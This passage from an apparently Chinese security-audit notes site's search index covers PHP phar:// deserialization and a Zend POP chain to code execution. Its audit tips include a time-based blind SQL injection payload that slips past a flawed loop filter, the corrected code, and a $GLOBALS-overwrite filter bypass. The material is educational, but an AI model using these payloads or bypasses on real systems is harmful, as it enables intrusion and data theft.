$o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u56e0\u4e3a\u4e0d\u662f\u6587\u672c\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528 hexdump \u770b\u4e00\u4e0b\u6587\u4ef6\u7684\u5185\u5bb9 \u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\u6211\u4eec\u7684 TestObject \u7c7b\u5df2\u7ecf\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u5165\u6587\u4ef6\u4e2d \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\u4e86\uff0cphp\u4e00\u5927\u90e8\u5206\u7684\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u5728\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a \u53c2\u8003 \u00b6 \u6df1\u5165\u7406\u89e3PHP\u53cd\u5e8f\u5217\u5316","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#_1","text":"\u81ea\u4ece Orange \u5728 2017\u5e74\u7684 hitcon \u51fa\u4e86\u4e00\u4e2a 0day \u7684 php phar:// \u53cd\u5e8f\u5217\u5316\u7ed9\u6574\u4e2a\u5b89\u5168\u754c\u5f00\u542f\u4e86\u65b0\u4e16\u754c\u7684\u5927\u95e8\u4ee5\u540e\uff0cphp \u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u9010\u6e10\u5347\u6e29\uff0c\u6ca1\u60f3\u5230\u540e\u6765 2018 \u5e74 blackhat \u7684\u8bae\u9898\u4e0a\u8fd9\u4e2a\u95ee\u9898\u518d\u6b21\u88ab\u63d0\u53ca\uff0c\u5229\u7528\u7684\u8fd8\u662f Orange \u7684\u601d\u8def(\u6211\u53ea\u80fd orz),\u5230\u73b0\u5728 phar:// \u53cd\u5e8f\u5217\u5316\u5df2\u7ecf\u6210\u4e3a\u4e86\u5404\u5927 CTF \u7099\u624b\u53ef\u70ed\u7684\u601d\u8def\uff0c\u5c31\u4eff\u4f5b 2016 \u5e74\u7684 CVE-2016-7124 \u7ed5\u8fc7 __weakup \u4e00\u6837\uff0c\u4e8e\u662f\u6211\u4e5f\u628a\u8fd9\u7bc7\u6587\u7ae0\u63d0\u4e0a\u65e5\u7a0b\uff0c\u5e0c\u671b\u80fd\u5728\u5bf9\u6574\u4e2a PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5256\u6790\u8fc7\u7a0b\u4e2d\u5bf9\u5176\u6709\u66f4\u6df1\u5165\u7684\u7406\u89e3\uff0c\u4e5f\u5e0c\u671b\u8bfb\u8005\u5728\u8bfb\u6211\u7684\u6587\u7ae0\u4e2d\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u548c\u6536\u83b7(\u5982\u679c\u771f\u7684\u662f\u8fd9\u6837\uff0c\u8fd9\u5c06\u662f\u6211\u83ab\u5927\u7684\u8363\u5e78)","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#jason","text":"","title":"\u4ecejason\u5f00\u59cb\u7c7b\u6bd4"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#pop","text":"\u6574\u4e2a\u4ee3\u7801\u7247\u6bb5\u6211\u5c06\u4ee5\u56fe\u7247\u7684\u5f62\u5f0f\u5c55\u73b0\uff0c\u6709\u5174\u8da3\u7684\u8bfb\u8005\u8bf7\u5148\u81ea\u5df1\u5206\u6790\uff0c\u4e4b\u540e\u5728\u770b\u6211\u7684\u5206\u6790\uff0c \u5f53\u7136\u8fd9\u4e2a\u6848\u4f8b\u91cc\u9762\u4f3c\u4e4e\u5c11\u4e86\u6bd4\u8f83\u5173\u952e\u7684 unserialize() \u51fd\u6570\uff0c\u90a3\u6211\u4eec\u5c31\u5047\u8bbe\u8fd9\u4e2a unserialize() \u5728\u6211\u4eec\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u91cc\u9762\uff0c\u5e76\u4e14\u53c2\u6570\u5b8c\u5168\u53ef\u63a7 \u5982\u4e0b\u8fd9\u4e2a\u7c7b\u4e2d\u6709\u4e00\u4e2a __destruct \u65b9\u6cd5\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u63a7\u5236 $_writers \u8c03\u7528 shutdown \u65b9\u6cd5 Zend_Log_Writer_Mail \u7c7b\u4e2d\u6709\u4e00\u4e2a shutdown \u65b9\u6cd5\u53ef\u4ee5\u5c1d\u8bd5\uff0c\u6211\u4eec\u770b\u5230\u8fd9\u4e2a\u7c7b\u91cc\u9762\u4f7f\u7528\u4e86 $write \u5bf9\u8c61\u7684\u5f88\u591a\u5c5e\u6027\uff0c\u6bd4\u5982\u8bf4 _layout \uff0c\u7136\u540e\u6211\u4eec\u53c8\u53d1\u73b0\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u8c03\u7528\u4e86\u4e00\u4e2a\u65b9\u6cd5 render() \uff0c\u8bf4\u660e\u8fd9\u4e2a\u5c5e\u6027\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e8e\u662f\u6211\u4eec\u8fd8\u8981\u5411\u66f4\u6df1\u5904\u6316\u6398 _layout \u662f\u8c01\u7684\u5bf9\u8c61\u5462\uff1f\u6211\u4eec\u53d1\u73b0\u4ed6\u662f Zend_layout \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540c\u6837\u7684\uff0c\u4ed6\u91cc\u9762\u662f\u7528\u4e86\u4e00\u4e2a _inflector \u7684\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8c03\u7528\u4e86 filter \u65b9\u6cd5\uff0c\u770b\u6765\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61 \u6211\u4eec\u53d1\u73b0 _inflector \u662f Zend_Filter_PregReplace \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e9b\u5c5e\u6027\u662f\u80fd\u8fdb\u884c\u76f4\u63a5\u63a7\u5236\u7684\uff0c\u5e76\u4e14\u5728\u8c03\u7528 filter \u65b9\u6cd5\u7684\u65f6\u5019\u80fd\u76f4\u63a5\u89e6\u53d1 preg_replace() \u65b9\u6cd5\uff0c\u592a\u597d\u4e86\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u6211\u4eec\u53ea\u8981\u63a7\u5236\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u5229\u7528\u94fe \u6240\u4ee5\u6574\u4e2a POP \u94fe\u5c31\u662f 1 writer->shutdown()->render()->filter()->preg_replace(\u6211\u4eec\u63a7\u5236\u7684\u5c5e\u6027)->\u4ee3\u7801\u6267\u884c","title":"POP\u94fe\u5b9e\u6218"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#phar-php","text":"","title":"\u5229\u7528 phar:// \u62d3\u5c55 PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#1-php","text":"(1)\u9996\u5148\u6211\u4eec\u5fc5\u987b\u6709 unserailize() \u51fd\u6570 (2)unserailize() \u51fd\u6570\u7684\u53c2\u6570\u5fc5\u987b\u53ef\u63a7 \u8fd9\u4e24\u4e2a\u662f\u539f\u5148\u5b58\u5728 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5fc5\u8981\u6761\u4ef6\uff0c\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6761\u4ef6\u4f60\u8c08\u90fd\u4e0d\u8981\u8c08\uff0c\u6839\u672c\u4e0d\u53ef\u80fd\uff0c\u4f46\u662f\u4ece2017 \u5e74\u5f00\u59cb Orange \u544a\u8bc9\u6211\u4eec\u662f\u53ef\u4ee5\u7684","title":"1.\u56de\u987e\u4e00\u4e0b\u539f\u5148 PHP \u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u5fc5\u8981\u6761\u4ef6"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#2phar","text":"\u539f\u6765 phar \u6587\u4ef6\u5305\u5728 \u751f\u6210\u65f6\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u914d\u5408 phar:// \u6211\u4eec\u5c31\u80fd\u5728\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 file_exists() is_dir() \u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u6784\u9020\u7cbe\u5fc3\u8bbe\u8ba1\u7684 phar \u5305\u5728\u6ca1\u6709 unserailize() \u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5c06 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u89e6\u53d1\u6761\u4ef6\u5927\u5927\u62d3\u5bbd\u4e86\uff0c\u964d\u4f4e\u4e86\u6211\u4eec PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u8d77\u70b9\u3002","title":"2.phar:// \u5982\u4f55\u6269\u5c55\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762\u7684"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#3-phar","text":"","title":"3.\u5177\u4f53\u89e3\u91ca\u4e00\u4e0b phar \u7684\u4f7f\u7528"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#1phar","text":"phar \u6587\u4ef6\u6700\u6838\u5fc3\u4e5f\u662f\u5fc5\u987b\u8981\u6709\u7684\u90e8\u5206\u5982\u56fe\u6240\u793a\uff1a (1) a stub \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2aPHP \u6587\u4ef6\u5b9e\u9645\u4e0a\u6211\u4eec\u80fd\u5c06\u5176\u7b80\u5316\u4e3a\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50 \u683c\u5f0f\u4e3a: 1 xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u8fd9\u90e8\u5206\u7684\u76ee\u7684\u5c31\u662f\u8ba9 phar \u6269\u5c55\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u7684 phar \u6587\u4ef6 (2\uff09a manifest describing the contents \u56e0\u4e3a Phar \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u5b83\u91cc\u9762\u5b58\u50a8\u7740\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 (3)the file contents \u8fd9\u90e8\u5206\u5c31\u662f\u6211\u4eec\u60f3\u8981\u538b\u7f29\u5728 phar \u538b\u7f29\u5305\u5185\u90e8\u7684\u6587\u4ef6","title":"1.Phar \u7684\u6587\u4ef6\u7ed3\u6784"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#2-phar","text":"\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u56e0\u4e3a\u4e0d\u662f\u6587\u672c\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528 hexdump \u770b\u4e00\u4e0b\u6587\u4ef6\u7684\u5185\u5bb9 \u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u6e05\u695a\u5730\u770b\u5230\u6211\u4eec\u7684 TestObject \u7c7b\u5df2\u7ecf\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u5165\u6587\u4ef6\u4e2d \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\u4e86\uff0cphp\u4e00\u5927\u90e8\u5206\u7684\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u5728\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a","title":"2.\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5408\u6cd5\u7684 Phar\u538b\u7f29\u6587\u4ef6"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/#_2","text":"\u6df1\u5165\u7406\u89e3PHP\u53cd\u5e8f\u5217\u5316","title":"\u53c2\u8003"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6 \u00b6 for\u5faa\u73af\u4e2d\u7684count \u00b6 \u5f53 count \u51fa\u73b0\u5728 for \u5faa\u73af\u4e2d\uff0c count \u6bcf\u6b21\u90fd\u4f1a\u8ba1\u7b97\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u6570\u7ec4\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5c31\u4f1a\u6709\u4e00\u4e9b\u5dee\u5f02\u3002 1 2 3 4 5 6 7 8 <?php $a = array ( \"a\" , \"b\" , \"c\" ); for ( $i = 0 ; $i < count ( $a ); $i ++ ) { if ( intval ( $a [ $i ]) < 1 ){ unset ( $a [ $i ]); } } var_dump ( $a ); \u9996\u5148\u53d6\u503c count($a)\uff0c\u6b64\u65f6\u4e3a 3 \u5faa\u73af\u7b2c\u4e00\u6b21\uff0c$i=0\uff0c\u5224\u65ad $a[0] \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6 $a \u4e3a [\"b\",\"c\"] \u5faa\u73af\u7b2c\u4e8c\u6b21\uff0c i=1\uff0c\u6267\u884c count( i=1\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 2\uff0c\u56e0\u4e3a 1<2\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5224\u65ad $a[1]\uff0c\u4e5f\u5c31\u662f b \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6\u6570\u7ec4\u5269\u4e00\u4e2a $a[2]\uff0c\u4e5f\u5c31\u662f c \u5faa\u73af\u7b2c\u4e09\u6b21\uff0c i=2\uff0c\u6267\u884c count( i=2\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 1\uff0c\u56e0\u4e3a 2>1\uff0c\u8fdb\u4e0d\u4e86\u5faa\u73af\u4e86\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u5230 if \u548c unset \u8fd9\u5757\u3002 \u4e00\u6bb5\u5b9e\u9645\u6817\u5b50\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $tmp [ $i ] = ( int ) $tmp [ $i ]; if ( $tmp [ $i ] < 1 ) unset ( $tmp [ $i ]); } $idlist = array_unique ( $tmp ); foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } } \u53d8\u91cfidlist\u4e2d\u7684\u201d0\u201d\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u201d1\u201d\u548c\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\uff0c\u8fd9\u8bf4\u660e\u6761\u4ef6\u5224\u65ad\u548cunset\u8bed\u53e5\u53ea\u8d77\u5230\u4e86\u4e00\u90e8\u5206\u4f5c\u7528\u3002\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f\u5728for\u5faa\u73af\u4e2d\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\u7684\u65f6\u5019\uff0c\u7531\u4e8e tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]\u4f1a\u88abunset\u6389\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5faa\u73af\u4e2d\u7684count( tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp[0]\uff09\uff0c\u6240\u4ee5\u6700\u7ec8$tmp[2]\u6839\u672c\u6ca1\u6709\u88ab\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4e8e\u662f\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\u3002 \u4fee\u590d\u65b9\u6848: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); $idlist = []; for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $val = ( int ) $tmp [ $i ]; if ( $val > 0 && ! in_array ( $val , $idlist )) $idlist [] = $val ; } foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } \u8fd9\u91cc\u540c\u65f6\u6d89\u53ca\u5230intval\u51fd\u6570\u7684\u4e00\u70b9\u77e5\u8bc6\uff1a 1 2 3 php > $a = intval('a'); php > var_dump($a); int(0) \u5e76\u4e14\u67e5\u770b\u5b98\u65b9\u6587\u6863\uff1a \u6210\u529f\u65f6\u8fd4\u56de var \u7684 integer \u503c\uff0c\u5931\u8d25\u65f6\u8fd4\u56de 0\u3002 \u7a7a\u7684 array \u8fd4\u56de 0\uff0c\u975e\u7a7a\u7684 array \u8fd4\u56de 1\u3002 \u6700\u5927\u7684\u503c\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3002 32 \u4f4d\u7cfb\u7edf\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u8303\u56f4\u662f -2147483648 \u5230 2147483647\u3002\u4e3e\u4f8b\uff0c\u5728\u8fd9\u6837\u7684\u7cfb\u7edf\u4e0a\uff0c intval('1000000000000') \u4f1a\u8fd4\u56de 2147483647\u300264 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u503c\u662f 9223372036854775807\u3002 \u603b\u7ed3 \u00b6 \u6bd4\u5982\u4e0b\u6b21\u5728\u5ba1\u8ba1\u4e2d\uff0c\u53ef\u4ee5\u7559\u610f for \u5faa\u73af\u4e2d\u662f\u5426\u662f\u7528\u4e86 count \u8fd9\u79cd\u91cd\u65b0\u8ba1\u7b97\u7684\u51fd\u6570\uff0c\u5e76\u4e14\u5728\u5faa\u73af\u5185\u64cd\u4f5c\u4e86\u8fd9\u4e2a\u53d8\u91cf\u3002\u6709\u53ef\u80fd\u5bfc\u81f4\u65f6\u95f4\u76f2\u6ce8 \u5168\u5c40\u53d8\u91cf\u8986\u76d6 \u00b6 1 2 3 4 5 6 7 8 9 10 11 foreach($_REQUEST as $_k=>$_v) { if( strlen($_k)>0 && preg_match('/^(cfg_|GLOBALS)/',$_k) && !isset($_COOKIE[$_k]) ) { exit('Request var not allow!'); } } foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) ${$_k} = $_v; } \u7a0d\u5fae\u7406\u89e3\u4e00\u4e0b\u4ee3\u7801\uff0c\u540e\u9762\u4e00\u4e2a foreach \u5faa\u73af\u5c31\u662f\u5bf9\u4e8e\u4e09\u4e2a\u6570\u7ec4\u53d6\u51fa\u6bcf\u4e2a\u5bf9\u5e94\u7684key\u548cvalue\uff0c\u5c06\u8fd9\u4e9bkey\u6ce8\u518c\u4e3a\u5168\u5c40\u7684\u53d8\u91cf \u63a7\u5236 $_GET \u4e3a _POST[GLOBALS][xixi] = 1; \u4e5f\u5c31\u662f $_GET[_POST[GLOBALS][xixi]]=1 \u5f53\u6267\u884c\u68c0\u6d4b\u65f6\uff0c\u7531\u4e8e $key \u662f _POST \uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u68c0\u6d4b\uff0c\u6b64\u65f6 post \u53c2\u6570\u662f\u7a7a\uff0c\u7136\u540e\u6267\u884c\u5230\u4e0b\u9762\u3002 \u6267\u884c foreach \u65f6\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\uff0c\u6b64\u65f6 $_request \u662f _GET \uff0c\u7136\u540e $_k \u662f _POST \uff0c\u6240\u4ee5\u662f ${_POST}['GLOBALS']['xixi'] = 1; \u7136\u540e\u6267\u884c\u5230\u7b2c\u4e8c\u6b21 foreach\uff0c\u6b64\u65f6 $_request \u4e3a _POST \uff0c $_k \u5c31\u662f\u6570\u7ec4\u7684\u952e\uff0c\u81ea\u7136\u5c31\u662f GLOBALS \uff0c\u6240\u4ee5\u6267\u884c\u7684\u5c31\u662f ${GLOBALS}['xixi']=1 \u8fd9\u6837\u5c31\u8986\u76d6\u4e86 $GLOBALS \u4e86\u3002\u3002 \u53c2\u8003 \u00b6 https://www.freebuf.com/vuls/207026.html https://xz.aliyun.com/t/5676","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#_1","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc6/#forcount","text":"\u5f53 count \u51fa\u73b0\u5728 for \u5faa\u73af\u4e2d\uff0c count \u6bcf\u6b21\u90fd\u4f1a\u8ba1\u7b97\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u6570\u7ec4\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5c31\u4f1a\u6709\u4e00\u4e9b\u5dee\u5f02\u3002 1 2 3 4 5 6 7 8 <?php $a = array ( \"a\" , \"b\" , \"c\" ); for ( $i = 0 ; $i < count ( $a ); $i ++ ) { if ( intval ( $a [ $i ]) < 1 ){ unset ( $a [ $i ]); } } var_dump ( $a ); \u9996\u5148\u53d6\u503c count($a)\uff0c\u6b64\u65f6\u4e3a 3 \u5faa\u73af\u7b2c\u4e00\u6b21\uff0c$i=0\uff0c\u5224\u65ad $a[0] \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6 $a \u4e3a [\"b\",\"c\"] \u5faa\u73af\u7b2c\u4e8c\u6b21\uff0c i=1\uff0c\u6267\u884c count( i=1\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 2\uff0c\u56e0\u4e3a 1<2\uff0c\u8fdb\u5165\u5faa\u73af\uff0c\u5224\u65ad $a[1]\uff0c\u4e5f\u5c31\u662f b \u662f\u5426\u5c0f\u4e8e 1\uff0c\u8fd4\u56de True\uff0cunset \u6389\uff0c\u6b64\u65f6\u6570\u7ec4\u5269\u4e00\u4e2a $a[2]\uff0c\u4e5f\u5c31\u662f c \u5faa\u73af\u7b2c\u4e09\u6b21\uff0c i=2\uff0c\u6267\u884c count( i=2\uff0c\u6267\u884c count( a)\uff0c\u6b64\u65f6\u4e3a 1\uff0c\u56e0\u4e3a 2>1\uff0c\u8fdb\u4e0d\u4e86\u5faa\u73af\u4e86\uff0c\u81ea\u7136\u5c31\u4e0d\u80fd\u5230 if \u548c unset \u8fd9\u5757\u3002 \u4e00\u6bb5\u5b9e\u9645\u6817\u5b50\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $tmp [ $i ] = ( int ) $tmp [ $i ]; if ( $tmp [ $i ] < 1 ) unset ( $tmp [ $i ]); } $idlist = array_unique ( $tmp ); foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } } \u53d8\u91cfidlist\u4e2d\u7684\u201d0\u201d\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u201d1\u201d\u548c\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\uff0c\u8fd9\u8bf4\u660e\u6761\u4ef6\u5224\u65ad\u548cunset\u8bed\u53e5\u53ea\u8d77\u5230\u4e86\u4e00\u90e8\u5206\u4f5c\u7528\u3002\u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f\u5728for\u5faa\u73af\u4e2d\uff0c\u7b2c\u4e00\u6b21\u5faa\u73af\u7684\u65f6\u5019\uff0c\u7531\u4e8e tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]< 1\uff0c\u56e0\u6b64 tmp[0]\u4f1a\u88abunset\u6389\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5faa\u73af\u4e2d\u7684count( tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp)\u5b9e\u9645\u4e0a\u6bd4\u7b2c\u4e00\u6b21\u5faa\u73af\u5c11\u4e861\uff08\u5c11\u4e86\u88abunset\u6389\u7684 tmp[0]\uff09\uff0c\u6240\u4ee5\u6700\u7ec8$tmp[2]\u6839\u672c\u6ca1\u6709\u88ab\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4e8e\u662f\u201c2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+\u2013+ \u201d\u88ab\u4fdd\u7559\u4e86\u4e0b\u6765\u3002 \u4fee\u590d\u65b9\u6848: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php $idlist = \"0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ \" ; if ( is_string ( $idlist ) ) { $tmp = explode ( ',' , $idlist ); $idlist = []; for ( $i = 0 ; $i < count ( $tmp ); $i ++ ) { $val = ( int ) $tmp [ $i ]; if ( $val > 0 && ! in_array ( $val , $idlist )) $idlist [] = $val ; } foreach ( $idlist as $value ){ echo $value ; echo \" \\n \" ; } \u8fd9\u91cc\u540c\u65f6\u6d89\u53ca\u5230intval\u51fd\u6570\u7684\u4e00\u70b9\u77e5\u8bc6\uff1a 1 2 3 php > $a = intval('a'); php > var_dump($a); int(0) \u5e76\u4e14\u67e5\u770b\u5b98\u65b9\u6587\u6863\uff1a \u6210\u529f\u65f6\u8fd4\u56de var \u7684 integer \u503c\uff0c\u5931\u8d25\u65f6\u8fd4\u56de 0\u3002 \u7a7a\u7684 array \u8fd4\u56de 0\uff0c\u975e\u7a7a\u7684 array \u8fd4\u56de 1\u3002 \u6700\u5927\u7684\u503c\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u3002 32 \u4f4d\u7cfb\u7edf\u6700\u5927\u5e26\u7b26\u53f7\u7684 integer \u8303\u56f4\u662f -2147483648 \u5230 